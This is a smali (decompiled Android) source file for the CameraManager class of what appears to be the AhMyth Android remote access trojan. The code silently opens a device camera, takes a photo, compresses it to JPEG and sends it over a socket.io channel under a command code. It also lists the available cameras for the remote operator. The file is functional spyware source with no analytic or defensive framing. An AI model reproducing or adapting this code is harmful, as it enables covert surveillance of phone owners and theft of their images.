.class public Lahmyth/mine/king/ahmyth/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 43
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 44
    iput-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->context:Landroid/content/Context;

    .line 45
    return-void
.end method

.method static synthetic access$000(Lahmyth/mine/king/ahmyth/CameraManager;)V
    .locals 0
    .param p0, "x0"    # Lahmyth/mine/king/ahmyth/CameraManager;

    .prologue
    .line 37
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lahmyth/mine/king/ahmyth/CameraManager;[B)V
    .locals 0
    .param p0, "x0"    # Lahmyth/mine/king/ahmyth/CameraManager;
    .param p1, "x1"    # [B

    .prologue
    .line 37
    invoke-direct {p0, p1}, Lahmyth/mine/king/ahmyth/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method private releaseCamera()V
    .locals 1

    .prologue
    .line 82
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 83
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 84
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 85
    const/4 v0, 0x0

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    .line 87
    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 8
    .param p1, "data"    # [B

    .prologue
    .line 66
    const/4 v4, 0x0

    :try_start_0
    array-length v5, p1

    invoke-static {p1, v4, v5}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 67
    .local v0, "bitmap":Landroid/graphics/Bitmap;
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 68
    .local v1, "bos":Ljava/io/ByteArrayOutputStream;
    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x14

    invoke-virtual {v0, v4, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 69
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 70
    .local v3, "object":Lorg/json/JSONObject;
    const-string v4, "image"

    const/4 v5, 0x1

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 71
    const-string v4, "buffer"

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 72
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v4

    invoke-virtual {v4}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v4

    const-string v5, "x0000ca"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    aput-object v3, v6, v7

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 79
    .end local v0    # "bitmap":Landroid/graphics/Bitmap;
    .end local v1    # "bos":Ljava/io/ByteArrayOutputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 75
    :catch_0
    move-exception v2

    .line 76
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 11

    .prologue
    const/4 v7, 0x0

    const/4 v10, 0x1

    .line 91
    iget-object v8, p0, Lahmyth/mine/king/ahmyth/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    const-string v9, "android.hardware.camera"

    invoke-virtual {v8, v9}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_0

    move-object v0, v7

    .line 136
    :goto_0
    return-object v0

    .line 100
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 101
    .local v0, "cameras":Lorg/json/JSONObject;
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    .line 102
    .local v5, "list":Lorg/json/JSONArray;
    const-string v8, "camList"

    const/4 v9, 0x1

    invoke-virtual {v0, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 105
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v6

    .line 106
    .local v6, "numberOfCameras":I
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    if-ge v2, v6, :cond_3

    .line 107
    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 108
    .local v3, "info":Landroid/hardware/Camera$CameraInfo;
    invoke-static {v2, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 109
    iget v8, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v8, v10, :cond_1

    .line 110
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 111
    .local v4, "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Front"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 112
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 113
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 106
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 115
    .end local v4    # "jo":Lorg/json/JSONObject;
    :cond_1
    iget v8, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v8, :cond_2

    .line 116
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 117
    .restart local v4    # "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Back"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 118
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 119
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 132
    .end local v0    # "cameras":Lorg/json/JSONObject;
    .end local v2    # "i":I
    .end local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v4    # "jo":Lorg/json/JSONObject;
    .end local v5    # "list":Lorg/json/JSONArray;
    .end local v6    # "numberOfCameras":I
    :catch_0
    move-exception v1

    .line 133
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    move-object v0, v7

    .line 136
    goto :goto_0

    .line 122
    .end local v1    # "e":Lorg/json/JSONException;
    .restart local v0    # "cameras":Lorg/json/JSONObject;
    .restart local v2    # "i":I
    .restart local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .restart local v5    # "list":Lorg/json/JSONArray;
    .restart local v6    # "numberOfCameras":I
    :cond_2
    :try_start_1
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 123
    .restart local v4    # "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Other"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 124
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 125
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_2

    .line 129
    .end local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v4    # "jo":Lorg/json/JSONObject;
    :cond_3
    const-string v8, "list"

    invoke-virtual {v0, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method

.method public startUp(I)V
    .locals 3
    .param p1, "cameraID"    # I

    .prologue
    const/4 v2, 0x0

    .line 50
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    .line 51
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->startPreview()V

    .line 52
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v1, Lahmyth/mine/king/ahmyth/CameraManager$1;

    invoke-direct {v1, p0}, Lahmyth/mine/king/ahmyth/CameraManager$1;-><init>(Lahmyth/mine/king/ahmyth/CameraManager;)V

    invoke-virtual {v0, v2, v2, v1}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 59
    return-void
.end method
